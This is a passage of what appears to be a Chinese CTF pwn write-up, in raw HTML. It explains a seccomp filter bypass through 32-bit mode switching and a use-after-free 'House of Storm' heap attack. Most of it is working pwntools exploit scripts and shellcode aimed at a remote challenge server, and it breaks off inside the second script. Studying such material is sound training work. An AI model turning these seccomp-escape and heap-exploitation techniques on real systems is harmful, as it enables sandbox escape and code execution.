class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这里是随便找的一个例子，可能不是很严谨。可以看到这里验证了架构，但是没有验证<code>sys_number</code>所以使用<code>sys_number|0x40000000</code>在下面的判断中不会被KILL掉，并且在后续执行过程中只会使用只会调用<code>sys_number</code></p><p>下面讲解一下如果上述两条都存在时我们需要调用ORW应该如何处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了<code>openat</code>，所以直接 调用<code>openat</code>，然后除了 read，write，其实还有两个<code>readv</code>，和<code>writev</code>，这些就能绕过限制读取flag</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>有了上述的基础就好做了，首先我们的思路就是想办法转到32位结构执行open，因为在32位的系统调用中open是5所以可以通过过滤。</p><p>不过这里我们需要知道的是在64位架构下的栈地址，在32位架构下是无法解析的，所以我还需要利用mmap生成一个可以放进esp中的地址当作栈。</p><p>其实有了上面的基础就很简单了，就不再赘述了直接给exp了。</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./shellcode&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2e],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2f],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x54],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*change to x86*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*0x4002DE\nb*0x4002EB\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx,eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"><span class="comment"># context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x29</span></span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*change to x64*/</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404089</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*write(1,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题目是十分常规的菜单类堆题，不过这里在main中做了一定处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">new_environment</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  old_addr = &amp;dword_0;</span><br><span class="line">  read(a1, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  buf = buf &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  change_addr(buf, <span class="number">0</span>, v1, v2, v3, v4);</span><br><span class="line">  munmap(old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  munmap((<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">  old_addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">change_addr</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// ST28_8</span></span><br><span class="line">  __int64 v2; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = a1 - (_QWORD)old_addr;</span><br><span class="line">  mmap((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)a1, old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), (<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), (<span class="keyword">char</span> *)&amp;_data_start + (_QWORD)old_addr, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">  retaddr += v2;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体调试后得知这里会将process原本的基地址的内容转移到新的mmap出来的地址上去。不知道为什么如果这样干了gdb就会出现报错无法调试。不过这里只是修改process地址对我们利用没什么影响所以本地调试时可以直接patch掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &gt; <span class="number">0xF</span> || !ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error: Invalid index!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是这道题目的漏洞点，很明显的UAF。忘了提一下，这里因为mallopt的缘故无法利用fastbin，虽然我们patch掉，但是如果用fastbin远程就打不通了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>题目给的glibc版本时2.23所以我的第一反应就是通过large bin attack劫持IO_FILE的vtable然后直接执行one_gadget。</p><p>不过实际操作会发现所有的one_gadget都不符合条件，所以我们只能另辟蹊径。</p><p>这里我想到的是通过setcontext进行栈迁移，最后rop拿到shell。不过在puts中调用vtable时使用的寄存器为rax，这里需要有堆地址的寄存器位rdi，所以找到了一个magic gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000065bca: mov rdi, rax; call qword ptr [rax + 0x20];</span><br></pre></td></tr></table></figure><h3 id="综上，exp-3"><a href="#综上，exp-3" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_storm&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./house_of_storm&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span 